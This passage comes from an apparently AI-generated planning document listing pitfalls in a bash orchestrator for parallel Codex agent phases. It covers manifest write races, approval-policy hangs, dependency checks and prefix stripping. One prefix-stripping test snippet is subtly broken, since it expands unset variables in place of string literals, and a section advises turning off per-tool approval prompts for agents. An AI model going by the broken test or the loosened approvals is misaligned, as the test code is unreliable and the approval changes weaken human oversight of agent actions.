    # Atomic append: cat temp to manifest
    # (Not truly atomic across processes, but good enough for rare collisions)
    cat "$temp_file" >> "$manifest"
    rm "$temp_file"

    # Why this works:
    # 1. Each process has unique temp file ($$)
    # 2. cat >> is atomic for small files
    # 3. Simpler than flock, no external dependencies
    # 4. Good enough for Phase 2 (agents rarely finish simultaneously)
}

# ✅ OPTION 3: Separate log files per agent, merge after (simplest)
# Each Phase 2 agent logs to its own file
log_phase_start_separate() {
    local feature="$1"
    local phase="$2"
    local manifest="prps/${feature}/codex/logs/manifest_${phase}.jsonl"

    local entry='{"phase":"'${phase}'","status":"started","timestamp":"'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'"}'
    echo "$entry" >> "$manifest"  # No collision - different files
}

# After Phase 2 completes, merge all manifests
merge_phase2_manifests() {
    local feature="$1"
    local manifest="prps/${feature}/codex/logs/manifest.jsonl"

    # Concatenate in order (no race condition - sequential)
    cat "prps/${feature}/codex/logs/manifest_phase2a.jsonl" >> "$manifest"
    cat "prps/${feature}/codex/logs/manifest_phase2b.jsonl" >> "$manifest"
    cat "prps/${feature}/codex/logs/manifest_phase2c.jsonl" >> "$manifest"

    # Cleanup
    rm "prps/${feature}/codex/logs/manifest_phase2"*.jsonl

    # Why this works:
    # 1. No concurrent writes to same file
    # 2. Merge happens after all agents complete (sequential)
    # 3. Simplest implementation
    # 4. Works even without flock
}
```

**Recommendation**: Use **Option 3** (separate files + merge) for simplicity, unless you need real-time manifest updates (then use Option 1 with flock).

**Testing for corruption**:
```bash
# Validate manifest is valid JSONL
validate_manifest() {
    local manifest="$1"

    # Try to parse each line as JSON
    local line_num=0
    while IFS= read -r line; do
        line_num=$((line_num + 1))
        if ! echo "$line" | jq empty 2>/dev/null; then
            echo "❌ Invalid JSON at line $line_num:"
            echo "$line"
            return 1
        fi
    done < "$manifest"

    echo "✅ Manifest is valid JSONL ($line_num lines)"
    return 0
}
```

---

### 10. Approval Policy Blocking Parallel Execution

**Severity**: Medium
**Category**: Workflow Hang / User Interruption
**Affects**: Phase 2 parallel execution with approval policy `on-request`
**Source**: Feature-analysis.md lines 404-409, INITIAL.md gotcha

**What it is**:
If Codex profile uses `approval_policy: on-request`, each Phase 2 agent prompts for user approval before reading files or searching Archon. In parallel execution, one agent waiting for approval blocks progress, even though the other two completed. User must manually approve each agent, breaking automation.

**Why it's a problem**:
- Workflow appears hung (waiting for stdin)
- User doesn't know which agent needs approval (all run in background)
- Defeats automation goal (requires manual intervention)
- Unpredictable: May not happen in every run (depends on agent timing)
- CI/CD pipelines timeout (no user to approve)

**How to detect it**:
- Workflow hangs during Phase 2, no progress
- `ps aux` shows codex process in sleep state
- Check profile: `codex profile show codex-prp | grep approval_policy`
- Test: Run with `on-request`, verify hang; switch to `on-failure`, verify success

**How to avoid/fix**:
```bash
# ❌ WRONG - Profile with on-request approval
# .codex/profiles/codex-prp.yaml
approval_policy: on-request  # Prompts for every tool use

# This hangs in parallel execution because:
# 1. Agent 2A reads file, prompts for approval
# 2. Agent 2B completes successfully
# 3. Agent 2C completes successfully
# 4. Workflow waits forever for 2A approval (no user at terminal)

# ✅ RIGHT - Profile with on-failure approval for Phase 2
# .codex/profiles/codex-prp.yaml
approval_policy: on-failure  # Only prompts if tool fails

# Phase 2 agents are read-only:
# - Archon search (mcp__archon__rag_search_knowledge_base)
# - Codebase grep (Grep tool)
# - File reads (Read tool)
# - Web search (WebSearch tool)
#
# No writes = low risk = safe to auto-approve

# For phases with writes (Phase 1, 4), use on-request:
# - Create directories
# - Write output files
# - Update Archon tasks

# Multi-profile approach (switch per phase)
execute_phase2_parallel() {
    # Temporarily override approval policy for Phase 2 only
    export CODEX_APPROVAL_POLICY="on-failure"

    timeout 600 codex exec --profile codex-prp --prompt "$(cat prompts/phase2a.txt)" > logs/2a.log 2>&1 &
    PID_2A=$!

    timeout 600 codex exec --profile codex-prp --prompt "$(cat prompts/phase2b.txt)" > logs/2b.log 2>&1 &
    PID_2B=$!

    timeout 600 codex exec --profile codex-prp --prompt "$(cat prompts/phase2c.txt)" > logs/2c.log 2>&1 &
    PID_2C=$!

    wait $PID_2A; EXIT_2A=$?
    wait $PID_2B; EXIT_2B=$?
    wait $PID_2C; EXIT_2C=$?

    unset CODEX_APPROVAL_POLICY
}

# Why this works:
# 1. Phase 2 runs without approval prompts (on-failure)
# 2. Read-only operations auto-approved
# 3. Failures still trigger approval (safety net)
# 4. Other phases can use stricter policy
```

**Alternative: Pre-approve specific tools**:
```yaml
# .codex/profiles/codex-prp.yaml
approval_policy: on-request
auto_approve_tools:
  - Read  # Auto-approve file reads
  - Grep  # Auto-approve codebase searches
  - mcp__archon__rag_search_knowledge_base  # Auto-approve Archon searches
  - WebSearch  # Auto-approve web searches
  - WebFetch  # Auto-approve web fetches
```

---

### 11. Dependency Validation Omission

**Severity**: Medium
**Category**: Logic Error / Premature Execution
**Affects**: Multi-phase workflows with dependencies
**Source**: Codebase-patterns.md lines 67-139

**What it is**:
If Phase 3 starts before Phase 2 completes (or while Phase 2 is still running), it has no inputs to work with. Without explicit dependency validation, bash continues to next phase even if prerequisites failed, causing cascading failures.

**Why it's a problem**:
- Phase 3 reads missing files (codebase-patterns.md, documentation-links.md, etc.)
- Gotcha detection runs with empty context, generates low-quality output
- No error until Phase 3 fails (not at dependency check)
- Hard to debug: Error message says "file not found", not "Phase 2 failed"

**How to detect it**:
- Search code for: Phase execution without dependency checks
- Test: Make Phase 2 fail, verify Phase 3 doesn't start
- Check: Is there explicit validation before each phase?
- Symptom: "File not found" errors in Phase 3 logs

**How to avoid/fix**:
```bash
# ❌ WRONG - No dependency validation
execute_phase "phase1"
execute_phase "phase2a"  # May fail
execute_phase "phase2b"  # May fail
execute_phase "phase2c"  # May fail
execute_phase "phase3"   # Runs even if Phase 2 failed!

# ✅ RIGHT - Explicit dependency validation
# Define dependencies
declare -A DEPENDENCIES=(
    [phase0]=""
    [phase1]="phase0"
    [phase2a]="phase1"
    [phase2b]="phase1"
    [phase2c]="phase1"
    [phase3]="phase2a,phase2b,phase2c"  # Depends on ALL Phase 2 agents
    [phase4]="phase3"
)

# Validate phase completion (from manifest)
validate_phase_completion() {
    local feature="$1"
    local phase="$2"
    local manifest="prps/${feature}/codex/logs/manifest.jsonl"

    # Check if phase completed successfully
    local entry=$(grep "\"phase\":\"${phase}\"" "$manifest" 2>/dev/null | tail -1)

    if [ -z "$entry" ]; then
        echo "❌ Phase $phase not found in manifest" >&2
        return 1
    fi

    # Parse status and exit_code
    local status=$(echo "$entry" | jq -r '.status // "unknown"' 2>/dev/null || echo "unknown")
    local exit_code=$(echo "$entry" | jq -r '.exit_code // 999' 2>/dev/null || echo "999")

    if [[ "$status" == "success" || "$exit_code" == "0" ]]; then
        return 0
    else
        echo "❌ Phase $phase failed (status: $status, exit: $exit_code)" >&2
        return 1
    fi
}

# Check dependencies before executing phase
check_dependencies() {
    local feature="$1"
    local phase="$2"
    local deps="${DEPENDENCIES[$phase]}"

    if [ -z "$deps" ]; then
        return 0  # No dependencies
    fi

    IFS=',' read -ra DEP_ARRAY <<< "$deps"

    for dep in "${DEP_ARRAY[@]}"; do
        if ! validate_phase_completion "$feature" "$dep"; then
            echo "❌ Dependency not met: $dep (required by $phase)" >&2
            echo "Cannot execute $phase until $dep completes successfully" >&2
            return 1
        fi
    done

    echo "✅ All dependencies met for $phase"
    return 0
}

# Execute phase with dependency validation
execute_phase_safe() {
    local feature="$1"
    local phase="$2"

    echo "Checking dependencies for $phase..."
    if ! check_dependencies "$feature" "$phase"; then
        echo "❌ Skipping $phase (dependencies not met)"
        return 1
    fi

    echo "Executing $phase..."
    execute_phase "$phase"
}

# Usage
FEATURE="test_feature"
execute_phase_safe "$FEATURE" "phase1"
execute_phase_safe "$FEATURE" "phase2a"
execute_phase_safe "$FEATURE" "phase3"  # Blocked if Phase 2 failed

# Why this works:
# 1. Dependencies explicit and documented
# 2. Validation checks manifest (ground truth)
# 3. Clear error if dependency not met
# 4. Prevents cascading failures
```

---

## Low Priority Gotchas

### 12. Redundant prp_ Prefix in Feature Names

**Severity**: Low
**Category**: Naming Convention / Code Smell
**Affects**: PRP file naming
**Source**: Codebase-patterns.md lines 1120-1145, PRP naming conventions

**What it is**:
Creating PRPs with filenames like `prps/prp_feature.md` instead of `prps/feature.md`. The `prp_` prefix is redundant because files are already in the `prps/` directory. This violates naming conventions and is rejected by security validation.

**Why it's a problem**:
- Redundant and verbose: `prps/prp_feature.md` vs `prps/feature.md`
- Violates naming convention (see .claude/conventions/prp-naming.md)
- Security validation rejects it (6th level check)
- Inconsistent with existing codebase PRPs
- Confusion: Is it `prp_prp_feature` or `prp_feature`?

**How to detect it**:
- Search for: `prp_` in feature names or filenames
- Check validation logs: "Redundant prp_ prefix detected"
- Grep: `find prps/ -name "prp_*.md"`
- Review: Compare with existing PRPs (none have prp_ prefix)

**How to avoid/fix**:
```bash
# ❌ WRONG - Redundant prefix
PRP_FILE="prps/prp_user_authentication.md"
# Directory already says "prps", why repeat "prp"?

# ✅ RIGHT - No redundant prefix
PRP_FILE="prps/user_authentication.md"

# Validation catches this
if [[ "$FEATURE_NAME" == prp_* ]]; then
    echo "❌ Redundant 'prp_' prefix detected: $FEATURE_NAME"
    echo "Files are in prps/ directory - prefix is redundant"
    echo "Expected: ${FEATURE_NAME#prp_}"
    echo "See: .claude/conventions/prp-naming.md"
    exit 1
fi
```

**Correct naming**:
- ✅ `prps/user_auth.md` → `prps/user_auth/`
- ✅ `prps/INITIAL_new_feature.md` → `prps/new_feature/`
- ❌ `prps/prp_feature.md` (redundant)
- ❌ `prps/prp_prp_feature.md` (very wrong)

---

### 13. removeprefix() vs replace() for INITIAL_ Stripping

**Severity**: Low
**Category**: Edge Case Bug / Incorrect Parsing
**Affects**: Feature name extraction from INITIAL.md files
**Source**: Security-validation.md, codebase-patterns.md lines 420-430

**What it is**:
Using `.replace("INITIAL_", "")` instead of `.removeprefix("INITIAL_")` to strip the INITIAL_ prefix from filenames. The `replace()` method removes ALL occurrences of the string, not just the prefix, which causes incorrect parsing for edge cases like `INITIAL_INITIAL_test.md`.

**Why it's a problem**:
- Edge case: `INITIAL_INITIAL_test.md` → `test.md` (should be `INITIAL_test.md`)
- Unexpected: User meant nested INITIAL prefix, not double prefix
- Bash: `${var#prefix}` only removes from start (correct), but `${var//pattern/}` removes all (wrong)
- Not caught by tests unless you specifically test double prefix

**How to detect it**:
- Search code for: `.replace("INITIAL_", "")` or `${var//INITIAL_/}`
- Test: Pass `INITIAL_INITIAL_test.md`, verify output is `INITIAL_test` not `test`
- Review: Check if prefix stripping is from start only or global replace

**How to avoid/fix**:
```python
# ❌ WRONG - Removes ALL occurrences
basename = "INITIAL_INITIAL_test"
feature = basename.replace("INITIAL_", "")
# Result: "test" (both INITIAL_ removed)

# ✅ RIGHT - Only removes from start (Python 3.9+)
basename = "INITIAL_INITIAL_test"
feature = basename.removeprefix("INITIAL_")
# Result: "INITIAL_test" (only leading INITIAL_ removed)

# Why this matters:
# User might create: prps/INITIAL_INITIAL_feature.md (typo or intentional)
# Expected feature name: INITIAL_feature (keep second INITIAL_)
# Wrong result: feature (stripped both)
```

```bash
# ❌ WRONG - Bash replace all
basename="INITIAL_INITIAL_test"
feature="${basename//INITIAL_/}"  # Double slash = replace all
# Result: "test"

# ✅ RIGHT - Bash remove prefix
basename="INITIAL_INITIAL_test"
feature="${basename#INITIAL_}"  # Single hash = remove prefix
# Result: "INITIAL_test"

# Why this works:
# 1. ${var#pattern} removes shortest match from start
# 2. ${var##pattern} removes longest match from start
# 3. ${var%pattern} removes shortest match from end
# 4. ${var//pattern/replace} replaces ALL occurrences (avoid for prefix stripping)
```

**Testing**:
```bash
test_removeprefix() {
    # Test normal case
    local result="${INITIAL_test#INITIAL_}"
    [[ "$result" == "test" ]] || { echo "❌ Normal case failed"; exit 1; }

    # Test double prefix (edge case)
    local result="${INITIAL_INITIAL_test#INITIAL_}"
    [[ "$result" == "INITIAL_test" ]] || { echo "❌ Double prefix failed"; exit 1; }

    echo "✅ removeprefix tests passed"
}
```

---

## Gotcha Checklist for Implementation

Before marking PRP complete, verify these gotchas are addressed:

### Critical (Must Fix)
- [ ] **Exit code timing**: `wait $PID; EXIT=$?` pattern used (not delayed capture)
- [ ] **Security validation**: 6-level feature name validation implemented
- [ ] **Zombie prevention**: All `codex exec` wrapped with `timeout` command

### High Priority (Should Fix)
- [ ] **PID race condition**: PIDs captured immediately with `$!`, not via `jobs -p`
- [ ] **Timeout handling**: Exit codes 124/125/137 distinguished with different handling
- [ ] **Profile enforcement**: `--profile codex-prp` in all `codex exec` calls
- [ ] **Output isolation**: Separate log files per agent (no shared stdout)
- [ ] **Parallelization**: Phase 2 agents run with `&` backgrounding (not sequential)

### Medium Priority (Consider Fixing)
- [ ] **Manifest corruption**: File locking (flock) OR separate files + merge
- [ ] **Approval policy**: `on-failure` for Phase 2, or tool-specific auto-approve
- [ ] **Dependency validation**: Phase 3 checks Phase 2 completion before starting

### Low Priority (Nice to Have)
- [ ] **Naming convention**: No `prp_` prefix in feature names (validation rejects)
- [ ] **Prefix stripping**: Use `removeprefix()` (Python) or `${var#prefix}` (bash)

---

## Testing Strategy for Gotchas

### Unit Tests (Fast, Isolated)
```bash
# Test 1: Exit code capture timing
test_exit_code_capture  # From gotcha #1

# Test 2: Security validation
test_feature_name_validation  # From gotcha #2

# Test 3: Timeout kills hung process
test_timeout_kills_hung_process  # From gotcha #3

# Test 4: Parallel execution timing
test_parallel_timing  # From gotcha #8
```

### Integration Tests (Slow, End-to-End)
```bash
# Test 5: Full PRP generation with parallel Phase 2
test_e2e_prp_generation  # Verifies gotchas #1, 3, 7, 8, 10 together

# Test 6: Partial failure handling
test_phase2_partial_failure  # One agent fails, verify detected (gotcha #1, 4)

# Test 7: Manifest validation
test_manifest_corruption  # Concurrent writes don't corrupt (gotcha #9)
```

### Security Tests (Attack Scenarios)
```bash
# Test 8: Path traversal attack
test_path_traversal_rejection  # From gotcha #2

# Test 9: Command injection attack
test_command_injection_rejection  # From gotcha #2
```

---

## Confidence Assessment

**Gotcha Coverage**: 9/10

- **Security**: HIGH - All major attack vectors covered (path traversal, injection, validation bypass)
- **Performance**: HIGH - Parallel execution, timeout handling, sequential anti-patterns documented
- **Reliability**: HIGH - Exit code timing, race conditions, dependency validation, zombie processes
- **Completeness**: VERY HIGH - 13 gotchas with solutions, detection methods, and tests

**Gaps**:
- **Codex CLI behavior**: No official docs, relying on observed behavior and examples
  - Assumption: Exit codes follow Unix conventions (0=success, non-zero=failure)
  - Assumption: `--profile` flag works like Claude CLI profiles
- **JSONL atomicity**: Assumes POSIX O_APPEND for <512 byte writes
  - May not hold on NFS, HDFS, or non-POSIX filesystems
  - Mitigation: Document requirement for local filesystem, or use flock
- **Bash version**: Assumes Bash 4.0+ (macOS default is 3.2, may need upgrade)
  - Mitigation: Document requirement or use portable constructs

**Sources Confidence**:
- **Very High**: Local codebase examples (phase_orchestration.sh, log-phase.sh) - battle-tested
- **High**: Stack Overflow, GNU manuals, OWASP - authoritative sources with community validation
- **Medium**: Web search results - cross-referenced multiple sources for consistency

---

## Recommendations for PRP Assembly

When generating the PRP:

1. **Include critical gotchas** in "Known Gotchas & Library Quirks" section:
   - Exit code timing (gotcha #1) - CRITICAL, include code example
   - Security validation (gotcha #2) - CRITICAL, reference 6 levels
   - Timeout wrapper (gotcha #3) - CRITICAL, show exit code handling

2. **Reference solutions** in "Implementation Blueprint":
   - Task: "Implement Phase 2 parallel execution" → Include gotcha #1 solution
   - Task: "Add feature name validation" → Include gotcha #2 solution
   - Task: "Wrap codex exec with timeout" → Include gotcha #3 solution

3. **Add detection tests** to validation gates:
   - Unit test: Exit code capture (gotcha #1)
   - Unit test: Security validation (gotcha #2)
   - Integration test: Parallel timing (gotcha #8)

4. **Warn about version issues**:
   - Bash 4.0+ required for wait with PID
   - GNU timeout required (install coreutils on macOS)
   - jq optional (has grep fallback in log-phase.sh)

5. **Highlight anti-patterns** to avoid:
   - Sequential execution (gotcha #8) - defeats entire purpose
   - Missing timeout (gotcha #3) - workflow hangs
   - Profile omission (gotcha #6) - wrong model/config

---

## Sources Referenced

### From Archon
- No highly relevant results for bash parallel execution or process management
- Archon is valuable for general programming, not bash-specific patterns

### From Web
- **Stack Overflow** (exit codes, parallel wait): https://stackoverflow.com/questions/356100
- **GNU Timeout Manual** (exit codes, signals): https://man7.org/linux/man-pages/man1/timeout.1.html
- **OWASP Path Traversal** (security): https://owasp.org/www-community/attacks/Path_Traversal
- **PortSwigger Command Injection** (security): https://portswigger.net/web-security/os-command-injection
- **Unix Stack Exchange** (file locking, atomic writes): https://unix.stackexchange.com/questions/344360
- **DigitalOcean** (job control tutorial): https://www.digitalocean.com/community/tutorials/how-to-use-bash-s-job-control-to-manage-foreground-and-background-processes

### From Codebase
- **feature-analysis.md**: Lines 490-538 (gotchas from INITIAL.md research)
- **codebase-patterns.md**: Lines 996-1175 (anti-patterns section)
- **documentation-links.md**: Lines 484-519 (exit code timing best practices)
- **examples-to-include.md**: Phase orchestration example with PID tracking
- **security-validation.md**: 6-level validation pattern (from .claude/patterns/)

---

Generated: 2025-10-07
Feature: codex_commands
Total Gotchas: 13 (3 Critical, 5 High, 3 Medium, 2 Low)
Output: /Users/jon/source/vibes/prps/codex_commands/planning/gotchas.md
